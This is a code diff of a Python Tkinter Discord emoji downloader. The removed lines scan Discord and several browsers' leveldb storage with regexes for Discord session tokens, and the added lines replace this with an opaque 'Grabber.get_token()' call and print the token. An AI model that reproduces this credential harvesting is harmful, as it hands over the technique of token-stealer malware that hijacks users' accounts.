@@ -1,13 +1,12 @@
-#1.0.2
-from tkinter import simpledialog, filedialog, Tk
+#1.1
+from tkinter import filedialog, Tk
 import Discord_Emoji_Downloader_support
-import tkinter.ttk as ttk
 import winsound as ws
 import tkinter as tk
 import requests
 import sys
 import os
-import re
+import Grabber
 
 
 root = Tk()
@@ -15,59 +14,23 @@ root.withdraw()
 root.attributes('-topmost', True)
 
 
-def find_tokens(path):
-    path += '\\Local Storage\\leveldb'
-
+def find_tokens():
     tokens = []
-
-    for file_name in os.listdir(path):
-        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-            continue
-
-        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                for token in re.findall(regex, line):
-                    tokens.append(token)
+    tokens.append(Grabber.get_token())
     return tokens
 
 
 def main():
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
     global userid
+    token = find_tokens()
+    print(token[0])
 
-    paths = {
-        'Discord': roaming + '\\discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Discord PTB': roaming + '\\discordptb',
-        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
-        'Edge': local + '\\Microsoft\\Edge\\User Data\\Default'
-    }
-
-    for platform, path in paths.items():
-        if not os.path.exists(path):
-            continue
-        tokenspre = find_tokens(path)
-        prefix = 'mfa.'
-        token = [x for x in tokenspre if x.startswith(prefix)]
-        print(token)
-
-    try:
+    if token != []:
         userid = token[0]
-        if 'mfa.' in userid:
-            pass
-        else:
-            userid = token[1]
-            if 'mfa.' in userid:
-                pass
-    except:
+    else:
         ws.PlaySound('SystemAsterisk', 0)
         userid = tk.simpledialog.askstring("DC Emoji Downloader", "Couldn't detect your UserToken. Please enter it manually.")
-        if not userid.startswith('mfa.'):
-            main()
+
 
 if __name__ == '__main__':
     main()
@@ -93,7 +56,6 @@ def downloader():
 
     for event in data:
         emojiid = event['id']
-        emojiname = event['name']
         animated = event['animated']
         if animated == True:
             emojiurl = "https://cdn.discordapp.com/emojis/"+emojiid+'.gif'
@@ -150,6 +112,7 @@ class MainWindow:
 
 
         def getID():
+            tk.messagebox.showinfo("DC Emoji Downloader", "The download will now start.\nDuring that time the window will freeze.\nJust wait until it's done.")
             global servername
             global data
             guildid = self.ServerID.get()
@@ -183,9 +146,6 @@ class MainWindow:
         #   top is the toplevel containing window.'''
         _bgcolor = '#d9d9d9'  # X11 color: 'gray85'
         _fgcolor = '#000000'  # X11 color: 'black'
-        _compcolor = '#d9d9d9' # X11 color: 'gray85'
-        _ana1color = '#d9d9d9' # X11 color: 'gray85'
-        _ana2color = '#ececec' # Closest X11 color: 'gray92'
 
         top.geometry("309x144+993+452")
         top.minsize(120, 1)
